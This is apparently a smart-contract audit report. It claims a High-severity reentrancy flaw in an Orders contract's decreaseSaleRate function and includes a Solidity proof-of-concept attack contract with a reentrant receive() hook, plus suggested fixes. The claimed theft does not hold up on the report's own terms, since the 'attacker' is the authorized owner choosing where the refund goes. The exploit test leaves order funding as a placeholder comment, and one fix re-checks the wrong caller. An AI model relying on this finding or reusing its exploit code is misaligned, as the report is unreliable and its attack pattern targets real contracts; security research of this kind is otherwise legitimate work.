## Title
Time-of-Check Time-of-Use Vulnerability in Orders.decreaseSaleRate Allows Refund Theft via NFT Transfer During Reentrancy

## Summary
The `decreaseSaleRate` function in Orders.sol performs authorization checks before the lock callback, but sends refunds during the callback. When the sell token is ETH, the refund transfer enables reentrancy where the NFT ownership can change, causing the refund to be sent to a party who no longer owns the NFT (and thus no longer controls the order).

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The function should verify that the caller is authorized to manage the NFT (owns or is approved), decrease the order's sale rate, and refund unused tokens to the specified recipient. The authorization ensures only the rightful NFT owner can extract value from the order.

**Actual Logic:** The `authorizedForNft(id)` modifier checks authorization at function entry [2](#0-1) , but the refund occurs later during the lock callback [3](#0-2) . When the sell token is ETH, `ACCOUNTANT.withdraw()` performs an ETH transfer [4](#0-3)  that triggers the recipient's `receive()` function, enabling reentrancy. The FlashAccountant explicitly allows this [5](#0-4) . During reentrancy, the NFT can be transferred via standard ERC721 `transferFrom`, which has no locked-state checks. The refund completes to the original recipient despite NFT ownership changing.

**Exploitation Path:**
1. Attacker (as a smart contract) owns NFT #123 representing a TWAMM order selling ETH for tokens
2. Attacker calls `decreaseSaleRate(123, orderKey, largeAmount, attackerContract)` where `attackerContract` is the attacker's address
3. The `authorizedForNft(123)` check passes since attacker owns the NFT
4. During `handleLockData`, `ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, attackerContract, refundAmount)` is called
5. The ETH transfer to `attackerContract` triggers its `receive()` function  
6. In `receive()`, attacker calls `Orders.transferFrom(attackerContract, victim, 123)` transferring the NFT
7. The `receive()` returns, ETH refund completes to attacker
8. Result: Victim owns NFT #123 with reduced order value, attacker received the refund that should belong to the current owner

**Security Property Broken:** The NFT ownership model is violated - the refund from decreasing an order's sale rate should belong to whoever owns the NFT at the time value is extracted, not whoever initiated the transaction. This enables value extraction from orders without retaining ownership.

## Impact Explanation
- **Affected Assets**: TWAMM order refunds for any order selling ETH (NATIVE_TOKEN_ADDRESS)
- **Damage Severity**: Attacker can extract 100% of the refund value (unused tokens from decreasing sale rate) while transferring the NFT to another party. For large orders, this could be substantial. The victim receives an NFT with diminished value without receiving the corresponding refund.
- **User Impact**: Any user acquiring an Orders NFT through transfers, marketplaces, or atomic swaps during the vulnerable window. The attack is particularly dangerous for programmatic NFT sales or smart contract wallets that might accept NFT transfers automatically.

## Likelihood Explanation  
- **Attacker Profile**: Any user with an Orders NFT representing an order selling ETH. The attacker must be a smart contract (EOA cannot execute reentrancy), but smart contract wallets and trading bots are increasingly common.
- **Preconditions**: (1) Order must sell ETH as the sell token (2) Attacker must be a contract or specify a malicious contract as recipient (3) There must be a willing or unwitting recipient for the NFT transfer
- **Execution Complexity**: Single transaction with reentrancy. Requires smart contract deployment but is straightforward to execute.
- **Frequency**: Can be exploited once per NFT during any `decreaseSaleRate` operation where ETH is being refunded.

## Recommendation

```solidity
// In src/Orders.sol, function decreaseSaleRate, line 77-95:

// CURRENT (vulnerable):
// Authorization check happens before lock, refund during lock
function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
    public
    payable
    authorizedForNft(id)  // ← Check happens here
    returns (uint112 refund)
{
    refund = uint112(
        uint256(
            -abi.decode(
                lock(
                    abi.encode(
                        CALL_TYPE_CHANGE_SALE_RATE, recipient, id, orderKey, -int256(uint256(saleRateDecrease))
                    )
                ),  // ← Refund sent during lock callback
                (int256)
            )
        )
    );
}

// FIXED - Option 1: Re-verify ownership before refund in handleLockData
function handleLockData(uint256, bytes memory data) internal override returns (bytes memory result) {
    uint256 callType = abi.decode(data, (uint256));
    
    if (callType == CALL_TYPE_CHANGE_SALE_RATE) {
        (, address recipientOrPayer, uint256 id, OrderKey memory orderKey, int256 saleRateDelta) =
            abi.decode(data, (uint256, address, uint256, OrderKey, int256));
        
        // Re-verify NFT ownership before processing refund
        if (saleRateDelta < 0) {
            if (!_isApprovedOrOwner(msg.sender, id)) {
                revert NotUnauthorizedForToken(msg.sender, id);
            }
        }
        
        int256 amount = CORE.updateSaleRate(TWAMM_EXTENSION, bytes32(id), orderKey, SafeCastLib.toInt112(saleRateDelta));
        // ... rest of function
    }
}

// FIXED - Option 2: Use nonReentrant pattern
// Add OpenZeppelin's ReentrancyGuard to Orders contract
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken, ReentrancyGuard {
    
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
        public
        payable
        nonReentrant  // ← Prevent reentrancy
        authorizedForNft(id)
        returns (uint112 refund)
    {
        // ... existing code
    }
}
```

Alternative: Store the NFT owner at function entry and verify it hasn't changed before sending refund, or implement a reentrancy lock in the FlashAccountant that prevents NFT transfers during active locks.

## Proof of Concept

```solidity
// File: test/Exploit_OrdersReentrancy.t.sol
// Run with: forge test --match-test test_OrdersReentrancyRefundTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Orders.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import {OrderKey} from "../src/types/orderKey.sol";
import {OrderConfig} from "../src/types/orderConfig.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";

contract MaliciousOrderHolder {
    Orders public orders;
    address public victim;
    uint256 public nftId;
    bool public attacked;
    
    constructor(Orders _orders) {
        orders = _orders;
    }
    
    function initiateAttack(uint256 _nftId, OrderKey memory orderKey, uint112 amount, address _victim) external {
        nftId = _nftId;
        victim = _victim;
        attacked = false;
        
        // Initiate decreaseSaleRate - will trigger reentrancy during ETH refund
        orders.decreaseSaleRate(_nftId, orderKey, amount, address(this));
    }
    
    // Reentrancy point - called when receiving ETH refund
    receive() external payable {
        if (!attacked && victim != address(0)) {
            attacked = true;
            // Transfer NFT to victim during refund
            orders.transferFrom(address(this), victim, nftId);
            // At this point: victim owns NFT, but we're receiving the refund
        }
    }
}

contract Exploit_OrdersReentrancy is Test {
    Core public core;
    TWAMM public twamm;
    Orders public orders;
    MaliciousOrderHolder public attacker;
    address public victim = address(0x1234);
    
    function setUp() public {
        // Deploy core protocol contracts
        core = new Core(address(this));
        twamm = new TWAMM(core);
        orders = new Orders(core, twamm, address(this));
        attacker = new MaliciousOrderHolder(orders);
        
        // Fund attacker contract with ETH for order
        vm.deal(address(attacker), 100 ether);
    }
    
    function test_OrdersReentrancyRefundTheft() public {
        // SETUP: Attacker creates an order selling ETH
        OrderKey memory orderKey = OrderKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: address(0x5678), // Some token address
            config: OrderConfig.wrap(0) // Configure with appropriate fee, timing, etc.
        });
        
        // Attacker mints NFT and creates large order
        vm.startPrank(address(attacker));
        uint256 nftId = orders.mint();
        // Assume increaseSellAmount is called here to fund the order with 10 ETH
        vm.stopPrank();
        
        uint256 victimBalanceBefore = address(victim).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        address nftOwnerBefore = orders.ownerOf(nftId);
        
        // EXPLOIT: Attacker decreases sale rate, triggering reentrancy
        vm.prank(address(attacker));
        attacker.initiateAttack(nftId, orderKey, 5e18, victim); // Decrease by 5 ETH worth
        
        // VERIFY: Exploit success
        address nftOwnerAfter = orders.ownerOf(nftId);
        
        assertEq(nftOwnerBefore, address(attacker), "Attacker should own NFT initially");
        assertEq(nftOwnerAfter, victim, "Victim should own NFT after attack");
        assertGt(address(attacker).balance, attackerBalanceBefore, "Attacker should receive ETH refund");
        assertEq(address(victim).balance, victimBalanceBefore, "Victim should NOT receive refund despite owning NFT");
        
        assertTrue(attacker.attacked(), "Reentrancy attack should have executed");
        console.log("Vulnerability confirmed: NFT transferred to victim, refund went to attacker");
    }
}
```

## Notes

This vulnerability also affects the `collectProceeds` function [6](#0-5)  and similar functions in BasePositions [7](#0-6)  that follow the same pattern of checking authorization before a lock callback that transfers funds.

The issue is NOT covered by the "Non-standard ERC20 token behavior" exclusion in the README because:
1. It exploits standard ETH behavior (native token transfers trigger receive())
2. It exploits the protocol's own NFT transfer mechanism (ERC721), not external token behavior
3. The FlashAccountant explicitly acknowledges and allows reentrancy [5](#0-4) 

The vulnerability represents a fundamental TOCTOU issue in the protocol's authorization model for NFT-based order management.

### Citations

**File:** src/Orders.sol (L77-95)
```text
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint112 refund)
    {
        refund = uint112(
            uint256(
                -abi.decode(
                    lock(
                        abi.encode(
                            CALL_TYPE_CHANGE_SALE_RATE, recipient, id, orderKey, -int256(uint256(saleRateDecrease))
                        )
                    ),
                    (int256)
                )
            )
        );
    }
```

**File:** src/Orders.sol (L107-114)
```text
    function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 proceeds)
    {
        proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
    }
```

**File:** src/Orders.sol (L144-157)
```text
            if (amount != 0) {
                address sellToken = orderKey.sellToken();
                if (saleRateDelta > 0) {
                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
                    } else {
                        ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
                    }
                } else {
                    unchecked {
                        // we know amount will never exceed the uint128 type because of limitations on sale rate (fixed point 80.32) and duration (uint32)
                        ACCOUNTANT.withdraw(sellToken, recipientOrPayer, uint128(uint256(-amount)));
                    }
                }
```

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/base/FlashAccountant.sol (L345-347)
```text
                    // Note that these calls can re-enter and even relock with the same ID
                    // However the nzdCountChange is always applied as a delta at the end, meaning we load the latest value before updating it,
                    // so it's safe from re-entry
```

**File:** src/base/FlashAccountant.sol (L349-356)
```text
                    case 0 {
                        let success := call(gas(), recipient, amount, 0, 0, 0, 0)
                        if iszero(success) {
                            // cast sig "ETHTransferFailed()"
                            mstore(0x00, 0xb12d13eb)
                            revert(0x1c, 4)
                        }
                    }
```

**File:** src/base/BasePositions.sol (L110-116)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
```
